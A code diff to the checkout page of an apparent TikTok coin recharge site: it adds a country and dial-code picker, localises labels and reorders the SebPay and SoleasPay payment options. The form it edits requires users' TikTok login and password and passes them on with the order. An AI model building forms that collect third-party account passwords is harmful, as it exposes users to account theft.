@@ -41,6 +41,12 @@ import {
   paymentHistoryHref,
   subscribeToPaymentHistory,
 } from "@/app/lib/payments/payment-history";
+import {
+  ALL_COUNTRIES,
+  POPULAR_COUNTRIES,
+  detectUserCountry,
+  dialCodes,
+} from "@/app/lib/countries";
 
 type Language = "fr" | "en";
 type Theme = "light" | "dark";
@@ -77,14 +83,7 @@ function savePreference(key: "upcoin-language" | "upcoin-theme", value: string):
   window.dispatchEvent(new Event(PREFERENCE_CHANGE_EVENT));
 }
 
-type CountryLookupResponse = {
-  country_code?: string;
-};
 
-function isCountryLookupResponse(value: unknown): value is CountryLookupResponse {
-  return typeof value === "object" && value !== null &&
-    (!("country_code" in value) || typeof value.country_code === "string");
-}
 
 const copy = {
   fr: {
@@ -135,11 +134,14 @@ const copy = {
     nextOrder: "Vos transactions apparaîtront ici après votre première tentative de paiement.",
     progress: "Étape {current} sur {total}",
     rechargeInfo: "Informations de recharge",
-    tiktokUsername: "Nom d’utilisateur TikTok",
+    tiktokUsername: "Identifiant TikTok",
+    password: "Mot de passe",
+    country: "Pays",
+    optional: "optionnel",
     required: "obligatoire",
-    usernamePlaceholder: "votre pseudo TikTok",
+    usernamePlaceholder: "pseudo ou email",
     whatsapp: "Numéro WhatsApp",
-    whatsappHint: "Pour vous contacter au sujet de la commande",
+    whatsappHint: "Pour vous contacter en cas de besoin",
     whatsappPlaceholder: "6 00 00 00 00",
     emailAddress: "Adresse e-mail",
     emailPlaceholder: "client@exemple.com",
@@ -152,8 +154,9 @@ const copy = {
     paymentMethod: "Paiement sécurisé",
     selectedProvider: "Prestataire sélectionné",
     chooseProvider: "Choisissez votre prestataire de paiement",
-    soleasPayDescription: "Page de paiement hébergée",
-    sebPayDescription: "Mobile Money via Cloudflare",
+    recommended: "Recommandé",
+    popularCountries: "Pays populaires",
+    allCountries: "Tous les pays (A-Z)",
   },
   en: {
     mainMenu: "Main menu",
@@ -204,6 +207,9 @@ const copy = {
     progress: "Step {current} of {total}",
     rechargeInfo: "Recharge information",
     tiktokUsername: "TikTok username",
+    password: "Password",
+    country: "Country",
+    optional: "optional",
     required: "required",
     usernamePlaceholder: "your TikTok username",
     whatsapp: "WhatsApp number",
@@ -220,21 +226,11 @@ const copy = {
     paymentMethod: "Secure payment",
     selectedProvider: "Selected provider",
     chooseProvider: "Choose your payment provider",
-    soleasPayDescription: "Hosted payment page",
-    sebPayDescription: "Mobile Money through Cloudflare",
+    recommended: "Recommended",
+    popularCountries: "Popular countries",
+    allCountries: "All countries (A-Z)",
   },
 } as const;
-
-const dialCodes: Record<string, string> = {
-  CM: "+237", SN: "+221", CI: "+225", ML: "+223", BF: "+226", GN: "+224",
-  BJ: "+229", TG: "+228", NE: "+227", TD: "+235", GA: "+241", CG: "+242",
-  CD: "+243", CF: "+236", GQ: "+240", MR: "+222", DJ: "+253", KM: "+269",
-  MG: "+261", RW: "+250", BI: "+257", UG: "+256", KE: "+254", TZ: "+255",
-  NG: "+234", GH: "+233", ZA: "+27", MA: "+212", DZ: "+213", TN: "+216",
-  EG: "+20", ET: "+251", AO: "+244", MZ: "+258", ZM: "+260", ZW: "+263",
-  FR: "+33", BE: "+32", CH: "+41", CA: "+1", US: "+1", GB: "+44",
-  DE: "+49", ES: "+34", IT: "+39", PT: "+351", LU: "+352", HT: "+509",
-};
 
 const localeFor = (language: Language) => language === "fr" ? "fr-FR" : "en-US";
 
@@ -275,9 +271,10 @@ export default function Home() {
   const [showPassword, setShowPassword] = useState(false);
   const [whatsapp, setWhatsapp] = useState("");
   const [email, setEmail] = useState("");
+  const [countryCode, setCountryCode] = useState("CM");
   const [dialCode, setDialCode] = useState("+237");
   const [paymentOrderId, setPaymentOrderId] = useState("");
-  const [paymentProvider, setPaymentProvider] = useState<PaymentProvider>("soleaspay");
+  const [paymentProvider, setPaymentProvider] = useState<PaymentProvider>("sebpay");
   const [sideNavOpen, setSideNavOpen] = useState(false);
   const paymentHistorySnapshot = useSyncExternalStore(
     subscribeToPaymentHistory,
@@ -304,14 +301,15 @@ export default function Home() {
   }, [theme]);
 
   useEffect(() => {
-    fetch("https://ipapi.co/json/")
-      .then((response) => response.json() as Promise<unknown>)
-      .then((data) => {
-        if (isCountryLookupResponse(data) && data.country_code && dialCodes[data.country_code]) {
-          setDialCode(dialCodes[data.country_code]);
-        }
-      })
-      .catch(() => {});
+    let isMounted = true;
+    void detectUserCountry().then((detected) => {
+      if (!isMounted || !detected) return;
+      setCountryCode(detected.countryCode);
+      setDialCode(detected.dialCode);
+    });
+    return () => {
+      isMounted = false;
+    };
   }, []);
 
   useEffect(() => {
@@ -771,19 +769,19 @@ export default function Home() {
 
                 <div className="fields-row">
                   <label className="field-label">
-                    <span>Identifiant TikTok <span className="required">*</span></span>
+                    <span>{t.tiktokUsername} <span className="required">*</span></span>
                     <div className="field">
                       <span>@</span>
                       <input
                         value={username}
                         onChange={(event) => setUsername(event.target.value.replace(/^@/, ""))}
-                        placeholder="pseudo ou email"
+                        placeholder={t.usernamePlaceholder}
                         autoComplete="off"
                       />
                     </div>
                   </label>
                   <label className="field-label">
-                    <span>Mot de passe <span className="required">*</span></span>
+                    <span>{t.password} <span className="required">*</span></span>
                     <div className="field field-password">
                       <span><LockKeyhole size={16} /></span>
                       <input
@@ -797,7 +795,7 @@ export default function Home() {
                         type="button"
                         className="toggle-password"
                         onClick={() => setShowPassword(!showPassword)}
-                        aria-label={showPassword ? "Masquer le mot de passe" : "Afficher le mot de passe"}
+                        aria-label={showPassword ? (language === "fr" ? "Masquer le mot de passe" : "Hide password") : (language === "fr" ? "Afficher le mot de passe" : "Show password")}
                       >
                         {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                       </button>
@@ -806,14 +804,43 @@ export default function Home() {
                 </div>
 
                 <label className="field-label">
-                  <span>Numéro WhatsApp <span className="optional">(optionnel)</span> <span className="field-hint">— Pour vous contacter en cas de besoin</span></span>
-                  <div className="field">
-                    <span>{dialCode}</span>
+                  <span>
+                    {t.whatsapp} <span className="optional">({t.optional})</span>{" "}
+                    <span className="field-hint">— {t.whatsappHint}</span>
+                  </span>
+                  <div className="field country-phone-field">
+                    <select
+                      className="country-select"
+                      value={countryCode}
+                      onChange={(event) => {
+                        const nextCode = event.target.value;
+                        setCountryCode(nextCode);
+                        if (dialCodes[nextCode]) {
+                          setDialCode(dialCodes[nextCode]);
+                        }
+                      }}
+                      aria-label={t.country}
+                    >
+                      <optgroup label={t.popularCountries}>
+                        {POPULAR_COUNTRIES.map((country) => (
+                          <option key={`pop-${country.code}`} value={country.code}>
+                            {country.flag} {country.dialCode} ({country.name})
+                          </option>
+                        ))}
+                      </optgroup>
+                      <optgroup label={t.allCountries}>
+                        {ALL_COUNTRIES.map((country) => (
+                          <option key={`all-${country.code}`} value={country.code}>
+                            {country.flag} {country.dialCode} ({country.name})
+                          </option>
+                        ))}
+                      </optgroup>
+                    </select>
                     <input
                       type="tel"
                       value={whatsapp}
                       onChange={(event) => setWhatsapp(event.target.value.replace(/\D/g, ""))}
-                      placeholder="6 00 00 00 00"
+                      placeholder={t.whatsappPlaceholder}
                       inputMode="numeric"
                       pattern="[0-9]*"
                       autoComplete="tel"
@@ -873,30 +900,41 @@ export default function Home() {
                   >
                     <button
                       type="button"
-                      className={`payment-provider-option${paymentProvider === "soleaspay" ? " selected" : ""}`}
-                      role="radio"
-                      aria-checked={paymentProvider === "soleaspay"}
-                      onClick={() => setPaymentProvider("soleaspay")}
-                    >
-                      <span className="payment-logo soleaspay" aria-hidden="true">S</span>
-                      <span>
-                        <strong>SoleasPay</strong>
-                        <small>{t.soleasPayDescription}</small>
-                      </span>
-                      <span className="payment-provider-radio" aria-hidden="true" />
-                    </button>
-                    <button
-                      type="button"
                       className={`payment-provider-option${paymentProvider === "sebpay" ? " selected" : ""}`}
                       role="radio"
                       aria-checked={paymentProvider === "sebpay"}
                       onClick={() => setPaymentProvider("sebpay")}
                     >
-                      <span className="payment-logo sebpay" aria-hidden="true">S</span>
-                      <span>
-                        <strong>SebPay</strong>
-                        <small>{t.sebPayDescription}</small>
+                      <span className="payment-provider-badge">{t.recommended}</span>
+                      <span className="payment-logo-wrap" aria-hidden="true">
+                        <Image
+                          src={getAssetPath("/sebpay-logo.png")}
+                          alt="SebPay"
+                          width={44}
+                          height={28}
+                          className="payment-logo-img"
+                        />
                       </span>
+                      <strong className="payment-provider-name">SebPay</strong>
+                      <span className="payment-provider-radio" aria-hidden="true" />
+                    </button>
+                    <button
+                      type="button"
+                      className={`payment-provider-option${paymentProvider === "soleaspay" ? " selected" : ""}`}
+                      role="radio"
+                      aria-checked={paymentProvider === "soleaspay"}
+                      onClick={() => setPaymentProvider("soleaspay")}
+                    >
+                      <span className="payment-logo-wrap" aria-hidden="true">
+                        <Image
+                          src={getAssetPath("/soleaspay-logo.png")}
+                          alt="SoleasPay"
+                          width={44}
+                          height={28}
+                          className="payment-logo-img"
+                        />
+                      </span>
+                      <strong className="payment-provider-name">SoleasPay</strong>
                       <span className="payment-provider-radio" aria-hidden="true" />
                     </button>
                   </div>
@@ -953,6 +991,7 @@ export default function Home() {
                   password={password}
                   whatsapp={whatsapp}
                   dialCode={dialCode}
+                  countryCode={countryCode}
                   email={email}
                 />
               </div>
